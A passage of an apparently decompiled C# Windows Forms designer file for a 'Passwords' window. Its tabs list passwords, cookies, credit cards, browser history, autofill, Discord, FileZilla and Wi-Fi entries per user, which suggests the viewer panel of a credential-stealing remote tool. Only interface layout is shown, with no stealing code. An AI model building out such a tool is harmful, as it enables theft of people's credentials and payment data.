        this.ButFileZaill.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButFileZaill.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButFileZaill.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButFileZaill.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButFileZaill.CheckedState.Parent = this.ButFileZaill;
        this.ButFileZaill.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButFileZaill.CustomBorderColor = System.Drawing.Color.White;
        this.ButFileZaill.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButFileZaill.CustomImages.CheckedImage");
        this.ButFileZaill.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButFileZaill.CustomImages.HoveredImage");
        this.ButFileZaill.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButFileZaill.CustomImages.Image");
        this.ButFileZaill.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButFileZaill.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButFileZaill.CustomImages.Parent = this.ButFileZaill;
        this.ButFileZaill.FillColor = System.Drawing.Color.White;
        this.ButFileZaill.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButFileZaill.ForeColor = System.Drawing.Color.White;
        this.ButFileZaill.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButFileZaill.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButFileZaill.HoverState.FillColor = System.Drawing.Color.White;
        this.ButFileZaill.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButFileZaill.HoverState.Parent = this.ButFileZaill;
        this.ButFileZaill.ImageSize = new System.Drawing.Size(27, 27);
        this.ButFileZaill.Location = new System.Drawing.Point(3, 316);
        this.ButFileZaill.Name = "ButFileZaill";
        this.ButFileZaill.PressedColor = System.Drawing.Color.White;
        this.ButFileZaill.ShadowDecoration.Parent = this.ButFileZaill;
        this.ButFileZaill.Size = new System.Drawing.Size(38, 38);
        this.ButFileZaill.TabIndex = 24;
        this.ButFileZaill.UseTransparentBackground = true;
        this.ButFileZaill.Click += new System.EventHandler(ButFileZaill_Click);
        this.ButHistory.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButHistory.BackColor = System.Drawing.Color.Transparent;
        this.ButHistory.BorderRadius = 10;
        this.ButHistory.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButHistory.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButHistory.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButHistory.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButHistory.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButHistory.CheckedState.Parent = this.ButHistory;
        this.ButHistory.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButHistory.CustomBorderColor = System.Drawing.Color.White;
        this.ButHistory.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButHistory.CustomImages.CheckedImage");
        this.ButHistory.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButHistory.CustomImages.HoveredImage");
        this.ButHistory.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButHistory.CustomImages.Image");
        this.ButHistory.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButHistory.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButHistory.CustomImages.Parent = this.ButHistory;
        this.ButHistory.FillColor = System.Drawing.Color.White;
        this.ButHistory.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButHistory.ForeColor = System.Drawing.Color.White;
        this.ButHistory.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButHistory.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButHistory.HoverState.FillColor = System.Drawing.Color.White;
        this.ButHistory.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButHistory.HoverState.Parent = this.ButHistory;
        this.ButHistory.ImageSize = new System.Drawing.Size(27, 27);
        this.ButHistory.Location = new System.Drawing.Point(3, 140);
        this.ButHistory.Name = "ButHistory";
        this.ButHistory.PressedColor = System.Drawing.Color.White;
        this.ButHistory.ShadowDecoration.Parent = this.ButHistory;
        this.ButHistory.Size = new System.Drawing.Size(38, 38);
        this.ButHistory.TabIndex = 22;
        this.ButHistory.UseTransparentBackground = true;
        this.ButHistory.Click += new System.EventHandler(ButHistory_Click);
        this.ButFiles.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButFiles.BackColor = System.Drawing.Color.Transparent;
        this.ButFiles.BorderRadius = 10;
        this.ButFiles.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButFiles.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButFiles.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButFiles.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButFiles.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButFiles.CheckedState.Parent = this.ButFiles;
        this.ButFiles.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButFiles.CustomBorderColor = System.Drawing.Color.White;
        this.ButFiles.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButFiles.CustomImages.CheckedImage");
        this.ButFiles.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButFiles.CustomImages.HoveredImage");
        this.ButFiles.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButFiles.CustomImages.Image");
        this.ButFiles.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButFiles.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButFiles.CustomImages.Parent = this.ButFiles;
        this.ButFiles.FillColor = System.Drawing.Color.White;
        this.ButFiles.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButFiles.ForeColor = System.Drawing.Color.White;
        this.ButFiles.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButFiles.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButFiles.HoverState.FillColor = System.Drawing.Color.White;
        this.ButFiles.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButFiles.HoverState.Parent = this.ButFiles;
        this.ButFiles.ImageSize = new System.Drawing.Size(27, 27);
        this.ButFiles.Location = new System.Drawing.Point(3, 184);
        this.ButFiles.Name = "ButFiles";
        this.ButFiles.PressedColor = System.Drawing.Color.White;
        this.ButFiles.ShadowDecoration.Parent = this.ButFiles;
        this.ButFiles.Size = new System.Drawing.Size(38, 38);
        this.ButFiles.TabIndex = 21;
        this.ButFiles.UseTransparentBackground = true;
        this.ButFiles.Click += new System.EventHandler(ButFiles_Click);
        this.ButCookies.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButCookies.BackColor = System.Drawing.Color.Transparent;
        this.ButCookies.BorderRadius = 10;
        this.ButCookies.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButCookies.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButCookies.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButCookies.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButCookies.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButCookies.CheckedState.Parent = this.ButCookies;
        this.ButCookies.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButCookies.CustomBorderColor = System.Drawing.Color.White;
        this.ButCookies.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButCookies.CustomImages.CheckedImage");
        this.ButCookies.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButCookies.CustomImages.HoveredImage");
        this.ButCookies.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButCookies.CustomImages.Image");
        this.ButCookies.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButCookies.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButCookies.CustomImages.Parent = this.ButCookies;
        this.ButCookies.FillColor = System.Drawing.Color.White;
        this.ButCookies.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButCookies.ForeColor = System.Drawing.Color.White;
        this.ButCookies.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButCookies.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButCookies.HoverState.FillColor = System.Drawing.Color.White;
        this.ButCookies.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButCookies.HoverState.Parent = this.ButCookies;
        this.ButCookies.ImageSize = new System.Drawing.Size(27, 27);
        this.ButCookies.Location = new System.Drawing.Point(3, 52);
        this.ButCookies.Name = "ButCookies";
        this.ButCookies.PressedColor = System.Drawing.Color.White;
        this.ButCookies.ShadowDecoration.Parent = this.ButCookies;
        this.ButCookies.Size = new System.Drawing.Size(38, 38);
        this.ButCookies.TabIndex = 20;
        this.ButCookies.UseTransparentBackground = true;
        this.ButCookies.Click += new System.EventHandler(ButCookies_Click);
        this.ButPass.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButPass.BackColor = System.Drawing.Color.Transparent;
        this.ButPass.BorderRadius = 10;
        this.ButPass.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButPass.Checked = true;
        this.ButPass.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButPass.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButPass.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButPass.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButPass.CheckedState.Parent = this.ButPass;
        this.ButPass.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButPass.CustomBorderColor = System.Drawing.Color.White;
        this.ButPass.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButPass.CustomImages.CheckedImage");
        this.ButPass.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButPass.CustomImages.HoveredImage");
        this.ButPass.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButPass.CustomImages.Image");
        this.ButPass.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButPass.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButPass.CustomImages.Parent = this.ButPass;
        this.ButPass.FillColor = System.Drawing.Color.White;
        this.ButPass.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButPass.ForeColor = System.Drawing.Color.White;
        this.ButPass.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButPass.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButPass.HoverState.FillColor = System.Drawing.Color.White;
        this.ButPass.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButPass.HoverState.Parent = this.ButPass;
        this.ButPass.ImageSize = new System.Drawing.Size(27, 27);
        this.ButPass.Location = new System.Drawing.Point(3, 8);
        this.ButPass.Name = "ButPass";
        this.ButPass.PressedColor = System.Drawing.Color.White;
        this.ButPass.ShadowDecoration.Parent = this.ButPass;
        this.ButPass.Size = new System.Drawing.Size(38, 38);
        this.ButPass.TabIndex = 19;
        this.ButPass.UseTransparentBackground = true;
        this.ButPass.Click += new System.EventHandler(ButPass_Click);
        this.ButVisa.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButVisa.BackColor = System.Drawing.Color.Transparent;
        this.ButVisa.BorderRadius = 10;
        this.ButVisa.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButVisa.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButVisa.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButVisa.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButVisa.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButVisa.CheckedState.Parent = this.ButVisa;
        this.ButVisa.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButVisa.CustomBorderColor = System.Drawing.Color.White;
        this.ButVisa.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButVisa.CustomImages.CheckedImage");
        this.ButVisa.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButVisa.CustomImages.HoveredImage");
        this.ButVisa.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButVisa.CustomImages.Image");
        this.ButVisa.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButVisa.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButVisa.CustomImages.Parent = this.ButVisa;
        this.ButVisa.FillColor = System.Drawing.Color.White;
        this.ButVisa.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButVisa.ForeColor = System.Drawing.Color.White;
        this.ButVisa.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButVisa.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButVisa.HoverState.FillColor = System.Drawing.Color.White;
        this.ButVisa.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButVisa.HoverState.Parent = this.ButVisa;
        this.ButVisa.ImageSize = new System.Drawing.Size(27, 27);
        this.ButVisa.Location = new System.Drawing.Point(3, 96);
        this.ButVisa.Name = "ButVisa";
        this.ButVisa.PressedColor = System.Drawing.Color.White;
        this.ButVisa.ShadowDecoration.Parent = this.ButVisa;
        this.ButVisa.Size = new System.Drawing.Size(38, 38);
        this.ButVisa.TabIndex = 17;
        this.ButVisa.UseTransparentBackground = true;
        this.ButVisa.Click += new System.EventHandler(ButVisa_Click);
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.TitlrPage);
        this.PanelTitle.Controls.Add(this.LoaderConnect);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.ImageLogo);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(759, 77);
        this.PanelTitle.TabIndex = 596;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(728, 11);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 612;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(705, 11);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 614;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.TitlrPage.AllowParentOverrides = false;
        this.TitlrPage.AutoEllipsis = false;
        this.TitlrPage.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.TitlrPage.CursorType = null;
        this.TitlrPage.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TitlrPage.ForeColor = System.Drawing.Color.DarkGray;
        this.TitlrPage.Location = new System.Drawing.Point(145, 19);
        this.TitlrPage.Name = "TitlrPage";
        this.TitlrPage.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitlrPage.Size = new System.Drawing.Size(42, 15);
        this.TitlrPage.TabIndex = 608;
        this.TitlrPage.Text = "Browser";
        this.TitlrPage.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.TitlrPage.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.LoaderConnect.AllowStylePresets = true;
        this.LoaderConnect.BackColor = System.Drawing.Color.Transparent;
        this.LoaderConnect.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.LoaderConnect.Color = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LoaderConnect.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.LoaderConnect.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.LoaderConnect.Customization = "";
        this.LoaderConnect.DashWidth = 0.5f;
        this.LoaderConnect.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LoaderConnect.Image = null;
        this.LoaderConnect.Location = new System.Drawing.Point(12, 13);
        this.LoaderConnect.Name = "LoaderConnect";
        this.LoaderConnect.NoRounding = false;
        this.LoaderConnect.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
        this.LoaderConnect.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.LoaderConnect.ShowText = false;
        this.LoaderConnect.Size = new System.Drawing.Size(57, 50);
        this.LoaderConnect.Speed = 7;
        this.LoaderConnect.TabIndex = 607;
        this.LoaderConnect.Text = "bunifuLoader1";
        this.LoaderConnect.TextPadding = new System.Windows.Forms.Padding(0);
        this.LoaderConnect.Thickness = 6;
        this.LoaderConnect.Transparent = true;
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.AutoSize = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(563, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(64, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Passwords";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ImageLogo.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ImageLogo.Image = (System.Drawing.Image)resources.GetObject("ImageLogo.Image");
        this.ImageLogo.Location = new System.Drawing.Point(10, 13);
        this.ImageLogo.Name = "ImageLogo";
        this.ImageLogo.Size = new System.Drawing.Size(59, 50);
        this.ImageLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageLogo.TabIndex = 570;
        this.ImageLogo.TabStop = false;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 520);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(456, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 112);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 312);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(456, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(779, 108);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 312);
        this.PanelRight.TabIndex = 591;
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.Timer1.Interval = 2000;
        this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
        this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
        this.imageList1.Images.SetKeyName(0, "chrome.png");
        this.imageList1.Images.SetKeyName(1, "edge.png");
        this.imageList1.Images.SetKeyName(2, "FireFox.png");
        this.imageList1.Images.SetKeyName(3, "else.png");
        this.imageList1.Images.SetKeyName(4, "Discord.png");
        this.imageList1.Images.SetKeyName(5, "FileZilla.png");
        this.imageList1.Images.SetKeyName(6, "Wifi.png");
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(813, 555);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "Passwords";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Passwords";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(Passwords_FormClosing);
        base.Load += new System.EventHandler(Passwords_Load);
        base.Shown += new System.EventHandler(Passwords_Shown);
        this.panelForm.ResumeLayout(false);
        this.PagePAS.ResumeLayout(false);
        this.PagePasswords.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListPasswords).EndInit();
        this.ContexPasswords.ResumeLayout(false);
        this.PageCookies.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListCookies).EndInit();
        this.PageCreditCards.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListCreditCards).EndInit();
        this.PageHistory.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListHostiry).EndInit();
        this.PageAutoFill.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListAutoFiles).EndInit();
        this.PageBookmarks.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListMarket).EndInit();
        this.PageDiscord.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListDiscord).EndInit();
        this.ContexDiscord.ResumeLayout(false);
        this.PageFileZilla.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListFilezilla).EndInit();
        this.ContexListFileZilla.ResumeLayout(false);
        this.PageWiFi.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.ListWifi).EndInit();
        this.ContexListWifi.ResumeLayout(false);
        this.PaneControll.ResumeLayout(false);
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).EndInit();
        base.ResumeLayout(false);
    }
}
